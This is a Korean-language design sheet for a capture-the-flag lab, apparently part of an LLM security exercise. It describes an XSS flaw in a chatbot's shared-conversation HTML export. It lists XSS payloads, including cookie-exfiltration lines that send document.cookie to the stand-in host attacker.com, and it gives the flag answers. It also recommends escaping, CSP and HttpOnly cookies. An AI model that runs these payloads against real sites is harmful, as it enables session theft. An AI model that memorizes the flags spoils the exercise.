# 🧩 CTF 시나리오 05: 부적절한 출력 처리 (Improper Output Handling / XSS)

<br>

## 📌 시나리오 ID

`SCENARIO_05`

## 🧠 시나리오 개요

이 시나리오는 Cross-Site Scripting(XSS) 취약점이 존재하는 웹 챗봇 시스템인 ChatLLL을 대상으로 한다.

공격자는 사용자의 입력이 출력 시 적절히 이스케이프되지 않는다는 점을 악용하여, 공유 HTML 파일에 악성 JavaScript를 삽입하고, 이를 통해 관리자 세션 쿠키(`admin_session`)를 탈취하는 것이 목표이다.

<br>

## 🎯 시나리오 목표

* 사용자 입력을 통한 악성 스크립트 삽입하기

* 공유 HTML 기능을 통해 관리자 봇에게 해당 HTML 열람 유도하기

* XSS 실행 시 `admin_session=ctf05_flag{XSS_1n_5h4r3d_C0nv3r54710n5!}` 쿠키를 탈취하여 외부로 전송하기

<br>

## 🛠️ UI 구성 요소

| 구성 요소 | 설명 |
|-----|-----|
| 👀 헤더 및 문제 설명 | 시나리오 제목, 설명 문구 표현 |
| 📥 프롬프트 입력창 | 사용자가 질문을 입력 |
| 🧪 LLM 응답 출력창 | 시스템 프롬프트에 따라 응답이 다르게 출력 |
| 💬 대화 내용 공유 창 | 대화 내용 공유 |
| 🎯 힌트 보기 버튼 | 버튼 클릭 시 힌트 메시지 표시 (공격 방향 가이드 제공) |
| 🏁 FLAG 제출창 | 획득한 flag를 입력하여 정답 여부 확인 |

<br>

## 💥 공격 흐름 예시
### 1. 🔥 공격 기법

| 기법 | 설명 |
|-----------|------|
| `<script>` 삽입 | `<script>alert(1)</script>` 형태로 기본적인 XSS 실행                               |
| 쿠키 탈취         | `<script>location.href='http://attacker.com?c='+document.cookie</script>` |
| 이미지 오류 이벤트    | `<img src=x onerror=alert('XSS')>`                                        |
| HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
| DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |

### 2. 🕸️ 동작 흐름

| 단계 | 설명 |
|-----------|------|
| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨 |

### 3. 🛡️ 위협 요소 및 대응 방안

| 위협 | 설명 | 대응 |
|-----------|------|------|
| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |

### 4. ✅ 보안 권장 사항

* 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
* CSP 적용을 통해 인라인 및 외부 스크립트 제한
* 모든 사용자 입력에 대한 서버 측 필터링 적용
* `HttpOnly`, `Secure` 쿠키 설정으로 브라우저 접근 차단

<br>

## ✅ 테스트 케이스 예시

| 입력 | 기대 응답 |
|-----|-----|
| `안녕하세요`                                                          | 정상 HTML 생성, XSS 없음  |
| `<script>alert(1)</script>`                                      | 관리자 브라우저에서 alert 실행 |
| `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
| `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |

<br>

## 🧪 Flag 제출 방식

사용자는 획득한 Flag를 다음과 같이 제출합니다:

```bash
flag{llm_xss_success}
```

* 정답 시: `✅ 정답입니다!`
* 오답 시: `❌ 틀렸습니다.`

<br>

## 🔐 모델 요구 조건

* 관리자 브라우저에서 악성 스크립트가 실행되어야 함

* `admin_session` 쿠키를 외부 서버로 전송해야 함

* 플래그: `ctf05_flag{XSS_1n_5h4r3d_C0nv3r54710n5!}`